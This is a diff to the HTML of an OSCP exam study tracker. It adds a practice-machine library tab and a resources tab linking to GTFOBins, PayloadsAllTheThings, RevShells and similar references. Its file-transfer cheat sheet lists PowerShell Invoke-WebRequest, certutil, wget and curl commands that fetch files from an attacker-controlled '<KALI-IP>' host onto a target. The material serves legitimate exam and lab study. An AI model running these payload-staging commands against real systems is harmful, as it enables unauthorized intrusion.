@@ -58,6 +58,14 @@
           <i class="fa-solid fa-square-check"></i>
           <span>Exam Day Tracker</span>
         </button>
+        <button class="nav-btn" data-tab="practice">
+          <i class="fa-solid fa-gamepad"></i>
+          <span>CTF Prep</span>
+        </button>
+        <button class="nav-btn" data-tab="resources">
+          <i class="fa-solid fa-circle-nodes"></i>
+          <span>Quick Resources</span>
+        </button>
       </nav>
 
       <div class="progress-widget">
@@ -343,6 +351,165 @@
                   <!-- Generated dynamically via JS -->
                 </tbody>
               </table>
+            </div>
+          </div>
+
+        </div>
+      </section>
+
+      <!-- CTF Prep Section -->
+      <section class="view-section" id="view-practice">
+        <div class="tracker-intro">
+          <p>Practice makes perfect. Below is a curated database of recommended vulnerable machines from Proving Grounds, Hack The Box, and VulnHub that match the OSCP syllabus. Use the filters to plan your sessions and track your completion status locally.</p>
+        </div>
+
+        <div class="tracker-content glass-card" style="margin-bottom: 30px; padding: 24px;">
+          <h3><i class="fa-solid fa-filter text-blue"></i> Filter Machines</h3>
+          <div class="category-selectors" style="margin-top: 15px; gap: 15px; display: flex; flex-direction: column;">
+            <div style="display: flex; align-items: center; gap: 15px; flex-wrap: wrap;">
+              <span style="font-size: 0.85rem; color: var(--text-secondary); width: 80px; font-weight: 600;">Platform:</span>
+              <div class="filter-group-platform" style="display: flex; gap: 8px; flex-wrap: wrap;">
+                <div class="filter-chip active" data-filter-platform="all">All Platforms</div>
+                <div class="filter-chip" data-filter-platform="Proving Grounds">Proving Grounds</div>
+                <div class="filter-chip" data-filter-platform="Hack The Box">Hack The Box</div>
+                <div class="filter-chip" data-filter-platform="VulnHub">VulnHub</div>
+              </div>
+            </div>
+
+            <div style="display: flex; align-items: center; gap: 15px; flex-wrap: wrap;">
+              <span style="font-size: 0.85rem; color: var(--text-secondary); width: 80px; font-weight: 600;">OS Type:</span>
+              <div class="filter-group-os" style="display: flex; gap: 8px; flex-wrap: wrap;">
+                <div class="filter-chip active" data-filter-os="all">All OS</div>
+                <div class="filter-chip" data-filter-os="Linux">Linux</div>
+                <div class="filter-chip" data-filter-os="Windows">Windows</div>
+              </div>
+            </div>
+
+            <div style="display: flex; align-items: center; gap: 15px; flex-wrap: wrap;">
+              <span style="font-size: 0.85rem; color: var(--text-secondary); width: 80px; font-weight: 600;">Difficulty:</span>
+              <div class="filter-group-difficulty" style="display: flex; gap: 8px; flex-wrap: wrap;">
+                <div class="filter-chip active" data-filter-difficulty="all">All Difficulties</div>
+                <div class="filter-chip" data-filter-difficulty="Easy">Easy</div>
+                <div class="filter-chip" data-filter-difficulty="Medium">Medium</div>
+                <div class="filter-chip" data-filter-difficulty="Hard">Hard</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="tracker-content glass-card">
+          <div class="tracker-header-controls">
+            <h3><i class="fa-solid fa-gamepad text-teal"></i> Recommended Machines Library</h3>
+            <span id="practice-count-summary" class="text-teal font-bold" style="font-size: 0.9rem;">Showing 0 / 0 Machines</span>
+          </div>
+
+          <div class="table-container">
+            <table class="tracker-table">
+              <thead>
+                <tr>
+                  <th style="text-align: left;">Machine Name</th>
+                  <th>Platform</th>
+                  <th>OS</th>
+                  <th>Difficulty</th>
+                  <th style="text-align: left;">Key Focus & Tech Stack</th>
+                  <th>Practice State</th>
+                </tr>
+              </thead>
+              <tbody id="practice-tbody">
+                <!-- Populated dynamically via JS -->
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </section>
+
+      <!-- Quick Resources Section -->
+      <section class="view-section" id="view-resources">
+        <div class="shell-builder-grid">
+          
+          <!-- External Reference Links -->
+          <div class="builder-inputs glass-card">
+            <h3><i class="fa-solid fa-square-rss text-blue"></i> Essential Referentials</h3>
+            <p class="section-desc">Vital bookmarks and tools database for bypasses, privilege escalation cheats, and scan scripts.</p>
+            
+            <div class="reference-links-grid">
+              <a href="https://gtfobins.github.io/" target="_blank" class="ref-link-card">
+                <div class="ref-icon text-teal"><i class="fa-brands fa-linux"></i></div>
+                <div class="ref-desc">
+                  <strong>GTFOBins</strong>
+                  <span>Linux SUID/Sudo privilege escalations reference.</span>
+                </div>
+              </a>
+
+              <a href="https://lolbas-project.github.io/" target="_blank" class="ref-link-card">
+                <div class="ref-icon text-blue"><i class="fa-brands fa-windows"></i></div>
+                <div class="ref-desc">
+                  <strong>LOLBAS</strong>
+                  <span>Windows binaries execution & bypasses library.</span>
+                </div>
+              </a>
+
+              <a href="https://book.hacktricks.xyz/" target="_blank" class="ref-link-card">
+                <div class="ref-icon text-purple"><i class="fa-solid fa-book"></i></div>
+                <div class="ref-desc">
+                  <strong>HackTricks</strong>
+                  <span>Comprehensive cyber methodology catalog.</span>
+                </div>
+              </a>
+
+              <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" class="ref-link-card">
+                <div class="ref-icon text-red"><i class="fa-solid fa-code"></i></div>
+                <div class="ref-desc">
+                  <strong>PayloadsAllTheThings</strong>
+                  <span>Massive library of exploit command strings.</span>
+                </div>
+              </a>
+
+              <a href="https://www.revshells.com/" target="_blank" class="ref-link-card">
+                <div class="ref-icon text-teal"><i class="fa-solid fa-globe"></i></div>
+                <div class="ref-desc">
+                  <strong>RevShells Generator</strong>
+                  <span>Web-based interactive shell payload generator.</span>
+                </div>
+              </a>
+
+              <a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide" target="_blank" class="ref-link-card">
+                <div class="ref-icon text-purple"><i class="fa-solid fa-circle-question"></i></div>
+                <div class="ref-desc">
+                  <strong>OffSec Exam Guide</strong>
+                  <span>Official instructions, point systems, and reporting guidelines.</span>
+                </div>
+              </a>
+            </div>
+          </div>
+
+          <!-- File Transfer Cheatsheet -->
+          <div class="builder-outputs">
+            <div class="shell-card glass-card">
+              <div class="shell-card-header">
+                <h4><i class="fa-solid fa-cloud-arrow-up text-blue"></i> File Hosting (Kali Box)</h4>
+                <button class="copy-shell-btn" data-target="host-python"><i class="fa-regular fa-copy"></i> Copy</button>
+              </div>
+              <pre><code class="language-bash" id="host-python">python3 -m http.server 80</code></pre>
+              <div class="shell-card-footer-desc">Host current directory files on port 80. Alternative (FTP): <code>python3 -m pyftpdlib -p 21 -w</code></div>
+            </div>
+
+            <div class="shell-card glass-card">
+              <div class="shell-card-header">
+                <h4><i class="fa-brands fa-windows text-blue"></i> File Download (Windows Target)</h4>
+                <button class="copy-shell-btn" data-target="download-powershell"><i class="fa-regular fa-copy"></i> Copy</button>
+              </div>
+              <pre><code class="language-powershell" id="download-powershell">powershell -c "Invoke-WebRequest -Uri 'http://&lt;KALI-IP&gt;/file.exe' -OutFile 'file.exe'"</code></pre>
+              <div class="shell-card-footer-desc">Download files using PowerShell commands. Alternative (Certutil): <code>certutil.exe -urlcache -split -f http://&lt;KALI-IP&gt;/file.exe file.exe</code></div>
+            </div>
+
+            <div class="shell-card glass-card">
+              <div class="shell-card-header">
+                <h4><i class="fa-brands fa-linux text-teal"></i> File Download (Linux Target)</h4>
+                <button class="copy-shell-btn" data-target="download-wget"><i class="fa-regular fa-copy"></i> Copy</button>
+              </div>
+              <pre><code class="language-bash" id="download-wget">wget http://&lt;KALI-IP&gt;/file -O file</code></pre>
+              <div class="shell-card-footer-desc">Download files using Wget on Linux target. Alternative (Curl): <code>curl http://&lt;KALI-IP&gt;/file -o file</code></div>
             </div>
           </div>
 
